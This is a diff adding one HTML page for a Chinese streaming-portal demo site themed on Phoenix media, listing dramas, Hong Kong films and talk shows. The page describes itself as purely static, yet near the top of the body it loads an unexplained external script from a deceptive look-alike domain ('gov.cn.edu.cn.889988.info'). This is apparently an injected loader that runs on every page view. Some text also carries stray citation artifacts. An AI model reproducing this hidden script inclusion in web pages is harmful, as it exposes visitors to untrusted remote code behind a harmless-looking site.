@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>凤凰影视 - 凤鸣传媒宫·华语正剧/港台大片/凤凰纪实 | fenghuangyingshi-h5.github.io</title>
+<meta name="description" content="凤凰影视（fenghuangyingshi-h5.github.io）电影、华语正剧、港台大片、世界得奖片、纪录片、凤凰系栏目一站聚合。凤凰金+宫墙深红+夜传媒蓝，凤鸣传媒宫：开创新视野，创造新文化，有媒体品相的影视台。移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="凤凰影视,fenghuangyingshi-h5,凤鸣传媒宫,华语正剧,港台大片,凤凰纪实,世界得奖片,锵锵三人行,军情观察室" />
+<link rel="canonical" href="https://fenghuangyingshi-h5.github.io/" />
+<style>
+:root{
+  --bg:#0C1422;--bg2:#121E33;--panel:#16223A;--gold:#E7B23B;--red:#7A1F1F;
+  --blue:#15233B;--paper:#F6F1E7;--orange:#E8763C;--gray:#AEB9CC;--line:rgba(231,178,59,.34);--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(120% 80% at 8% -10%,rgba(231,178,59,.16),transparent 55%),
+    radial-gradient(120% 90% at 94% 0%,rgba(122,31,31,.22),transparent 55%),
+    radial-gradient(90% 70% at 50% 120%,rgba(232,118,60,.10),transparent 60%),
+    linear-gradient(180deg,#0A0F1C 0%,#0C1422 45%,#121E33 100%);
+  color:var(--paper);line-height:1.78;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.08;
+  background:repeating-linear-gradient(0deg,rgba(246,241,231,.06) 0 1px,transparent 1px 7px)}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(10,15,28,.88);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.phx{width:38px;height:38px;border-radius:50%;background:
+  conic-gradient(from 200deg,var(--gold),var(--orange),var(--red),var(--gold));
+  position:relative;box-shadow:0 0 18px rgba(231,178,59,.55)}
+.phx::before,.phx::after{content:"";position:absolute;top:6px;width:14px;height:22px;border-radius:50% 50% 40% 40%;
+  background:linear-gradient(180deg,#FFF3D6,var(--gold));opacity:.95}
+.phx::before{left:6px;transform:rotate(-18deg)}
+.phx::after{right:6px;transform:rotate(18deg) scaleY(-1)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:600}
+.menu{margin-left:auto;display:flex;gap:2px}
+.menu a{padding:8px 13px;border-radius:8px;font-size:13px;font-weight:700;color:var(--gray)}
+.menu a:hover{background:rgba(231,178,59,.16);color:var(--gold)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:132px;padding:8px 12px;border-radius:8px;border:1px solid var(--line);background:#0F1828;outline:none;font-size:13px;color:var(--paper)}
+.search-min button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:var(--gold);color:#2a1c05;font-size:13px}
+.burger{display:none;margin-left:auto;border:1px solid var(--line);background:#0F1828;border-radius:8px;padding:6px 10px;font-size:16px;color:var(--gold)}
+
+.hero{position:relative;z-index:1;margin:22px 0 6px;border-radius:26px;overflow:hidden;border:1px solid rgba(231,178,59,.5);
+  padding:48px 32px;background:linear-gradient(120deg,rgba(22,34,58,.98),rgba(18,30,51,.94))}
+.hero::before{content:"🦚 PHOENIX MEDIA HOUSE · 开创新视野，创造新文化";position:absolute;top:14px;left:20px;font-size:11px;color:var(--gold);letter-spacing:1px;font-family:ui-monospace,monospace}
+.hero::after{content:"";position:absolute;right:-30px;bottom:-40px;width:240px;height:240px;
+  background:radial-gradient(circle at 30% 30%,rgba(231,178,59,.9),rgba(122,31,31,.4) 45%,transparent 70%);filter:blur(40px);opacity:.5}
+.badge{display:inline-block;font-size:12px;font-weight:800;color:#2a1c05;background:var(--gold);padding:5px 14px;border-radius:999px;margin-bottom:12px}
+.hero h1{font-size:33px;margin:0 0 6px}
+.hero h1 em{font-style:normal;color:var(--orange);text-shadow:0 0 18px rgba(232,118,60,.5)}
+.hero p{color:#E7ECF6;font-size:14px;margin:0 auto 18px;max-width:690px}
+.bigbar{display:flex;gap:8px;max-width:690px;margin:0 auto;background:#0F1828;border:1px solid var(--gold);border-radius:999px;padding:6px 6px 6px 18px;box-shadow:0 0 22px rgba(231,178,59,.2)}
+.bigbar input{flex:1;border:0;outline:none;font-size:15px;background:transparent;color:var(--paper)}
+.bigbar button{border:0;padding:10px 24px;border-radius:999px;background:linear-gradient(135deg,var(--gold),var(--orange));color:#2a1c05;font-weight:900;cursor:pointer}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips a{font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;background:rgba(122,31,31,.18);border:1px solid rgba(232,118,60,.45);color:var(--orange)}
+.chips a:hover{background:var(--gold);color:#2a1c05;border-color:var(--gold)}
+
+.scenes{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;position:relative;z-index:1;margin-top:20px}
+.scene{background:var(--panel);border:1px solid rgba(231,178,59,.26);border-radius:16px;padding:16px}
+.scene .ic{font-size:22px}
+.scene h3{font-size:14px;margin:6px 0 2px;color:var(--gold)}
+.scene p{font-size:11px;color:var(--gray);margin:0}
+
+.section{padding:32px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap;border-left:5px solid var(--gold);padding-left:12px}
+.sec-head h2{font-size:21px;margin:0}
+.sec-head h2::before{content:"🦚 ";}
+.sec-head h2 .b{color:var(--orange)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--gold);font-size:12px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{background:var(--panel);border:1px solid rgba(231,178,59,.22);border-radius:18px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--orange);box-shadow:0 16px 40px rgba(232,118,60,.24)}
+.cover{aspect-ratio:3/4;border-radius:18px 18px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(160deg,#7A1F1F,#E7B23B)}
+.card:nth-child(2) .cover{background:linear-gradient(160deg,#15233B,#5FA8E0)}
+.card:nth-child(3) .cover{background:linear-gradient(160deg,#2a1c05,#E7B23B)}
+.card:nth-child(4) .cover{background:linear-gradient(160deg,#1f2a3a,#E8763C)}
+.card:nth-child(5) .cover{background:linear-gradient(160deg,#241a10,#F2C04B)}
+.card:nth-child(6) .cover{background:linear-gradient(160deg,#2a1020,#E05A7A)}
+.card:nth-child(7) .cover{background:linear-gradient(160deg,#102a2a,#5FD6C4)}
+.card:nth-child(8) .cover{background:linear-gradient(160deg,#1a1530,#9A7BFF)}
+.flag{font-size:10px;font-weight:900;padding:3px 9px;border-radius:999px;background:var(--paper);color:#1a1206}
+.flag.media{background:var(--gold);color:#2a1c05}
+.flag.hk{background:var(--orange);color:#2a1206}
+.flag.award{background:#5FA8E0;color:#062033}
+.cover h4{margin:auto 0 0;color:#fff;font-size:14px;text-shadow:0 2px 10px rgba(0,0,0,.6);width:100%}
+.body{padding:12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:5px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:999px;background:rgba(231,178,59,.12);color:var(--gray);font-weight:600}
+.body p{margin:0;font-size:11px;color:var(--gray)}
+
+.layout{display:grid;grid-template-columns:1fr 320px;gap:20px}
+.zones{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.zone{background:var(--panel);border:1px solid rgba(232,118,60,.26);border-radius:16px;padding:16px}
+.zone .ic{font-size:22px}
+.zone h3{font-size:14px;margin:6px 0 2px}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.side{background:var(--panel);border:1px solid rgba(231,178,59,.4);border-radius:16px;padding:16px}
+.side h3{font-size:15px;margin:0 0 12px;color:var(--gold)}
+.rk{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed rgba(231,178,59,.25)}
+.rk:last-child{border-bottom:0}
+.rk b{width:26px;color:var(--orange);font-size:15px;font-weight:900;font-family:ui-monospace,monospace}
+.rk div{flex:1}
+.rk div h4{margin:0;font-size:13px}
+.rk div span{font-size:10px;color:var(--gray)}
+.rk em{font-style:normal;font-size:11px;font-weight:800;color:#9fd0f2}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px}
+.ac{background:var(--panel);border:1px solid rgba(231,178,59,.22);border-radius:18px;padding:22px}
+.ac h3{margin:0 0 10px;font-size:17px}
+.ac h3::before{content:"🦚 ";}
+.ac p,.ac li{font-size:13px;color:var(--gray);line-height:1.8}
+.ac ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:#0F1828;border:1px solid rgba(231,178,59,.35);border-radius:14px;padding:12px}
+.st b{display:block;font-size:18px;color:var(--gold)}
+.st span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid rgba(231,178,59,.3);background:#0A0F1C;padding:26px 0 40px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1}
+footer.site a{color:var(--gold)}
+code{background:#0F1828;border:1px solid rgba(231,178,59,.3);padding:2px 7px;border-radius:6px;font-size:11px}
+
+@media(max-width:980px){.layout{grid-template-columns:1fr}.zones{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:repeat(3,1fr)}.about{grid-template-columns:1fr}.scenes{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#0A0F1C;border-bottom:1px solid rgba(231,178,59,.4);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:84px}.hero h1{font-size:23px}
+  .grid,.zones,.scenes{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="phx"></div>
+      <div>凤凰影视<small>fenghuangyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">凤凰首页</a>
+      <a href="#cn">华语正剧</a>
+      <a href="#hk">港台大片</a>
+      <a href="#world">世界得奖</a>
+      <a href="#doc">凤凰纪实</a>
+      <a href="#about">关于凤凰</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="漫长的季节 / 霸王别姬 / 教父 / 锵锵三人行 / 军情观察室" />
+      <button onclick="alert('演示站：播放用 # 占位')">🦚 开播</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <span class="badge">🦚 不是只会放片，是把片子当时代现场讲</span>
+    <h1>凤凰影视，<br/><em>凤鸣传媒宫，开新视野</em></h1>
+    <p>凤凰二字，本来就是华人传媒里的金色图腾：双凤绕圆、东西融合、严肃新闻+人文纪实+港台大片+华语正剧。这台 <strong>fenghuangyingshi-h5</strong> 不堆“爽剧短剧”，而按“视野 / 现场 / 人文 / 媒体品相”排片——你看《漫长的季节》《大明王朝1566》《霸王别姬》《教父》，也看《锵锵三人行》《军情观察室》《甲乙丙丁》。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="> 搜口径：华语正剧 / 港台大片 / 世界得奖 / 凤凰纪实 / 不悬浮" />
+      <button onclick="alert('演示站：结果用 # 占位')">凤鸣检索</button>
+    </div>
+    <div class="chips">
+      <a href="#cn">华语正剧</a>
+      <a href="#hk">港台大片</a>
+      <a href="#world">世界得奖</a>
+      <a href="#doc">凤凰纪实</a>
+      <a href="#scenes">媒体场景</a>
+      <a href="#rank">凤凰片单</a>
+    </div>
+
+    <div class="scenes" id="scenes">
+      <div class="scene"><div class="ic">📰</div><h3>现场与视野</h3><p>新闻短视频、军事、社会、两岸与国际现场。</p></div>
+      <div class="scene"><div class="ic">🎬</div><h3>华语正剧</h3><p>人世间、山海情、大明王朝，不悬浮不注水。</p></div>
+      <div class="scene"><div class="ic">🎞️</div><h3>港台大片</h3><p>成龙、发哥、星仔、王家卫、徐克，胶片味浓。</p></div>
+      <div class="scene"><div class="ic">🎥</div><h3>人文纪实</h3><p>纪录片、人物访谈、锵锵式对谈，脑子不关机。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="cn">
+    <div class="sec-head"><h2><span class="b">华语</span>正剧 · 不悬浮</h2><span>cn.drama</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag media">正剧</span><h4>漫长的季节</h4></div><div class="body"><div class="tags"><span>悬疑</span><span>东北</span><span>9.4</span></div><p>火车、玉米地、老头乐，时代褶皱里的人。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag media">历史</span><h4>大明王朝1566</h4></div><div class="body"><div class="tags"><span>权谋</span><span>9.7</span><span>台词封神</span></div><p>嘉靖、海瑞、严党、清流，华语剧的教科书。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">年代</span><h4>人世间</h4></div><div class="body"><div class="tags"><span>家庭</span><span>9.2</span><span>平民史</span></div><p>周家三代，国企、下岗、高考、北上，哭得稳。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">乡土</span><h4>山海情</h4></div><div class="body"><div class="tags"><span>扶贫</span><span>9.3</span><span>西北</span></div><p>吊庄、种菇、风沙口，主旋律拍出人味。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag media">文学</span><h4>我的阿勒泰</h4></div><div class="body"><div class="tags"><span>治愈</span><span>9.1</span><span>8集</span></div><p>哈萨克草原、汉语与风，慢得刚好。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">沪上</span><h4>繁花</h4></div><div class="body"><div class="tags"><span>王家卫味</span><span>8.7</span><span>90年代</span></div><p>黄河路、股票、宝总，上海话里全是生意。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag media">正剧</span><h4>觉醒年代</h4></div><div class="body"><div class="tags"><span>近代</span><span>9.3</span><span>思想史</span></div><p>陈独秀、李大钊、鲁迅，课本里的人会吵架。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">悬疑</span><h4>隐秘的角落</h4></div><div class="body"><div class="tags"><span>秦昊</span><span>9.1</span><span>“一起爬山”</span></div><p>三个小孩、一桩命案，夏天晒得人发毛。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="layout">
+      <div>
+        <div class="sec-head" id="hk"><h2><span class="b">港台</span>大片 · 胶片味</h2><span>hk.movies</span><a class="more" href="#">更多 #</a></div>
+        <div class="zones">
+          <div class="zone"><div class="ic">🐉</div><h3>霸王别姬</h3><p>张国荣、张丰毅、巩俐，华语电影的天花板之一。</p></div>
+          <div class="zone"><div class="ic">🕶️</div><h3>无间道</h3><p>“我想做个好人”，港产警匪的宿命感。</p></div>
+          <div class="zone"><div class="ic">🌆</div><h3>花样年华</h3><p>旗袍、走廊、王家卫的慢镜头与秘密。</p></div>
+          <div class="zone"><div class="ic">🥋</div><h3>警察故事</h3><p>成龙真身上阵，商场滑杆名场面。</p></div>
+          <div class="zone"><div class="ic">🤡</div><h3>功夫</h3><p>周星驰的猪笼城寨，荒诞里藏武侠梦。</p></div>
+          <div class="zone"><div class="ic">🎙️</div><h3>重庆森林</h3><p>罐头、机票、失恋计时，港式孤独。</p></div>
+        </div>
+
+        <div class="sec-head" id="world" style="margin-top:26px"><h2><span class="b">世界</span>得奖片 · 华人视角看</h2><span>world.awards</span><a class="more" href="#">更多 #</a></div>
+        <div class="grid">
+          <div class="card"><div class="cover"><span class="flag award">奥斯卡</span><h4>教父 一二三</h4></div><div class="body"><div class="tags"><span>黑帮</span><span>9.6</span><span>史诗</span></div><p>家族、权力、礼数，男人戏的圣经。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag award">戛纳</span><h4>霸王别姬</h4></div><div class="body"><div class="tags"><span>华语</span><span>9.6</span><span>金棕榈</span></div><p>不疯魔不成活，华人电影的世界名片。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag award">柏林</span><h4>生息之地</h4></div><div class="body"><div class="tags"><span>华语</span><span>新作</span><span>最佳导演</span></div><p>乡村、时间、土地，凤凰系影业也做这种片。[6](@ref)</p></div></div>
+          <div class="card"><div class="cover"><span class="flag award">经典</span><h4>肖申克的救赎</h4></div><div class="body"><div class="tags"><span>美国</span><span>9.7</span><span>自由</span></div><p>高墙、信、太平洋蓝，老片常看常新。</p></div></div>
+        </div>
+      </div>
+
+      <aside class="side" id="rank">
+        <h3>🦚 凤凰片单榜</h3>
+        <div class="rk"><b>01</b><div><h4>大明王朝1566</h4><span>华语正剧 / 权谋</span></div><em>9.7</em></div>
+        <div class="rk"><b>02</b><div><h4>漫长的季节</h4><span>东北 / 悬疑</span></div><em>9.4</em></div>
+        <div class="rk"><b>03</b><div><h4>霸王别姬</h4><span>港台 / 华语得奖</span></div><em>9.6</em></div>
+        <div class="rk"><b>04</b><div><h4>山海情</h4><span>乡土 / 正剧</span></div><em>9.3</em></div>
+        <div class="rk"><b>05</b><div><h4>无间道</h4><span>港产警匪</span></div><em>9.3</em></div>
+        <div class="rk"><b>06</b><div><h4>人世间</h4><span>年代 / 家庭</span></div><em>9.2</em></div>
+        <div class="rk"><b>07</b><div><h4>教父</h4><span>世界 / 黑帮史诗</span></div><em>9.6</em></div>
+        <div class="rk"><b>08</b><div><h4>锵锵三人行</h4><span>凤凰栏目 / 对谈</span></div><em>媒体品相</em></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="doc">
+    <div class="sec-head"><h2><span class="b">凤凰</span>纪实 · 栏目复活</h2><span>phoenix.docs</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag media">对谈</span><h4>锵锵三人行</h4></div><div class="body"><div class="tags"><span>窦文涛</span><span>闲聊</span><span>媒体史</span></div><p>三人一台戏，华人世界最有味的茶桌谈话。[7](@ref)</p></div></div>
+      <div class="card"><div class="cover"><span class="flag media">军事</span><h4>军情观察室</h4></div><div class="body"><div class="tags"><span>董嘉耀</span><span>台海/亚太</span><span>现场感</span></div><p>地图、军舰、导弹，凤凰最硬的一块牌子。[7](@ref)</p></div></div>
+      <div class="card"><div class="cover"><span class="flag media">人物</span><h4>鲁豫有约</h4></div><div class="body"><div class="tags"><span>访谈</span><span>明星/普通人</span><span>长谈</span></div><p>“说出你的故事”，华语访谈的国民记忆。[7](@ref)</p></div></div>
+      <div class="card"><div class="cover"><span class="flag media">纪录</span><h4>甲乙丙丁</h4></div><div class="body"><div class="tags"><span>自制</span><span>人物纪录</span><span>人文</span></div><p>凤凰视频自制人物纪录片，不喊口号讲人。[10](@ref)</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 凤凰影视</h2><span>about.phoenix</span></div>
+    <div class="about">
+      <div class="ac">
+        <h3>凤凰影视是什么？</h3>
+        <p>凤凰卫视台标是“一凤一凰绕成圆”，标准色用金，强调东方与西方、传统与现代的融合；凤凰视频又补了“严肃新闻、多元内容、人文关怀、媒体品相”。[5,15](@ref) 这台 <strong>fenghuangyingshi-h5</strong> 就把这层皮穿上：不是普通聚合站，而是<strong>凤鸣传媒宫</strong>——电影按视野排，剧集按格排，纪录片按现场排，栏目按脑子排。 配色用凤凰金+宫墙深红+夜传媒蓝，比林祥多传媒感、比狗狗少宠物、比同志少社群、比子夜少黑电影、比爱尚少少女、比大哥少江湖。 这里能看《大明王朝1566》《漫长的季节》《霸王别姬》《无间道》《教父》，也能回看《锵锵三人行》《军情观察室》《鲁豫有约》《甲乙丙丁》——放片之外，还有“为什么这片值得看”的媒体语气。</p>
+        <div class="stats">
+          <div class="st"><b>🦚</b><span>凤鸣传媒宫</span></div>
+          <div class="st"><b>6类</b><span>影/剧/纪录/栏目/港台/世界</span></div>
+          <div class="st"><b>4词</b><span>视野/现场/人文/媒体品相</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="ac">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端、无真实视频源</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>与凤凰卫视/凤凰视频/凤凰传奇影业无隶属，仅“凤鸣传媒宫”策展致敬[6](@ref)</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>凤凰金+宫墙深红+夜传媒蓝 = 开创新视野，创造新文化</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    🦚 凤凰影视 --host fenghuangyingshi-h5.github.io<br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 凤凰影视 Demo · 凤鸣传媒宫，开创新视野 🦚
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
